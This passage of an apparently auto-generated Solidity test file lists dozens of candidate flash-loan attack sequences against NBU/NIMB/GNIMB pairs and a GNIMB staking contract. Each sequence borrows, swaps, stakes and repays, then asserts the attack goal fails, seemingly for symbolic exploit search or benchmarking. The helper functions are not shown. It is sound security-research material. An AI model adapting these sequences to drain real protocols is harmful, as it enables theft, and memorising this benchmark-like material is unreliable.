        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1711(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1712(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1713(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1714(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1715(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1716(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1717(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1718(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1719(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1720(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1721(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1722(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1723(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1724(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1725(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1726(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1727(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1728(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1729(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1730(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1731(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1732(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1733(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1734(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1735(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1736(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1737(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1738(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1739(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1740(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1741(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1742(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1743(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1744(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1745(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1746(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1747(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1748(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1749(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1750(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1751(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1752(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1753(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1754(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1755(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1756(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1757(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1758(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1759(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1760(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1761(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
